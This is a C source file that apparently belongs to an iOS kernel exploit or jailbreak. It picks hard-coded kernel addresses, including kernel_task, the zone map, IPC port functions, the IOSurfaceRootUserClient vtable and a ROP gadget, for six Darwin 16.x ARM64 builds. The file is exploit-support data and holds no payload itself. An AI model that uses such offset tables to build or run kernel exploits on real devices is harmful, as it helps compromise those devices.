#include <sys/utsname.h>
#include "offsets.h"
#include "common.h"

void init_offsets() {

	struct utsname u;
	uname(&u);

	LOG("sysname: %s", u.sysname);
	LOG("nodename: %s", u.nodename);
	LOG("release: %s", u.release);
	LOG("version: %s", u.version);
	LOG("machine: %s", u.machine);

	if (strcmp(u.version, "Darwin Kernel Version 16.7.0: Thu Jun 15 18:33:36 PDT 2017; root:xnu-3789.70.16~4/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718d028;
		OFFSET_KERNEL_TASK = 0xfffffff0075b4048;
		OFFSET_REALHOST = 0xfffffff00753aba0;
		OFFSET_BZERO = 0xfffffff00708df80;
		OFFSET_ZONE_MAP = 0xfffffff007558478;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff00651a174;
		OFFSET_COPYOUT = 0xfffffff00718d21c;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b938c;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a60b4;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006ef2d78;
		OFFSET_KERNEL_MAP = 0xfffffff0075b4050;
		OFFSET_BCOPY = 0xfffffff00708ddc0;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a5bd8;
	}
	else if (strcmp(u.version, "Darwin Kernel Version 16.0.0: Sun Aug 28 20:36:55 PDT 2016; root:xnu-3789.2.4~3/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718af28;
		OFFSET_KERNEL_TASK = 0xfffffff0075ba050;
		OFFSET_REALHOST = 0xfffffff007540898;
		OFFSET_BZERO = 0xfffffff00708a140;
		OFFSET_ZONE_MAP = 0xfffffff00755e160;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff006532358;
		OFFSET_COPYOUT = 0xfffffff00718b130;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b47b0;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a16ec;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006efa7a0;
		OFFSET_KERNEL_MAP = 0xfffffff0075ba058;
		OFFSET_BCOPY = 0xfffffff007089f80;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a13a0;
	}
	else if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:35 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718d37c;
		OFFSET_KERNEL_TASK = 0xfffffff0075b4048;
		OFFSET_REALHOST = 0xfffffff00753aba0;
		OFFSET_BZERO = 0xfffffff00708df80;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b938c;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff00651e174;
		OFFSET_COPYOUT = 0xfffffff00718d570;
		OFFSET_ZONE_MAP = 0xfffffff007558478;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a60b4;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006ef2d78;
		OFFSET_KERNEL_MAP = 0xfffffff0075b4050;
		OFFSET_BCOPY = 0xfffffff00708ddc0;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a5bd8;
	}
	else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718f76c;
		OFFSET_KERNEL_TASK = 0xfffffff0075c2050;
		OFFSET_REALHOST = 0xfffffff007548a98;
		OFFSET_BZERO = 0xfffffff00708e140;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b98a0;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff006529fb0;
		OFFSET_COPYOUT = 0xfffffff00718f974;
		OFFSET_ZONE_MAP = 0xfffffff007566360;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a6200;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006efa320;
		OFFSET_KERNEL_MAP = 0xfffffff0075c2058;
		OFFSET_BCOPY = 0xfffffff00708df80;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a5d44;
	}
	else if (strcmp(u.version, "Darwin Kernel Version 16.1.0: Thu Sep 29 21:56:11 PDT 2016; root:xnu-3789.22.3~1/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718baf8;
		OFFSET_KERNEL_TASK = 0xfffffff0075be050;
		OFFSET_REALHOST = 0xfffffff007544898;
		OFFSET_BZERO = 0xfffffff00708a140;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b4e10;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff006531f38;
		OFFSET_COPYOUT = 0xfffffff00718bd00;
		OFFSET_ZONE_MAP = 0xfffffff007562160;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a1bf0;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006efa7e0;
		OFFSET_KERNEL_MAP = 0xfffffff0075be058;
		OFFSET_BCOPY = 0xfffffff007089f80;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a18a4;
	}
	else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T7000") == 0) {
		OFFSET_COPYIN = 0xfffffff00718d3a8;
		OFFSET_KERNEL_TASK = 0xfffffff0075b4048;
		OFFSET_REALHOST = 0xfffffff00753aba0;
		OFFSET_BZERO = 0xfffffff00708df80;
		OFFSET_ZONE_MAP = 0xfffffff007558478;
		OFFSET_ROP_ADD_X0_X0_0x10 = 0xfffffff00651d174;
		OFFSET_COPYOUT = 0xfffffff00718d59c;
		OFFSET_IPC_KOBJECT_SET = 0xfffffff0070b9374;
		OFFSET_IPC_PORT_ALLOC_SPECIAL = 0xfffffff0070a611c;
		OFFSET_IOSURFACEROOTUSERCLIENT_VTAB = 0xfffffff006ef2d78;
		OFFSET_KERNEL_MAP = 0xfffffff0075b4050;
		OFFSET_BCOPY = 0xfffffff00708ddc0;
		OFFSET_IPC_PORT_MAKE_SEND = 0xfffffff0070a5c40;
	}
	else {
		LOG("kernel missing");
		exit(1);
	}
}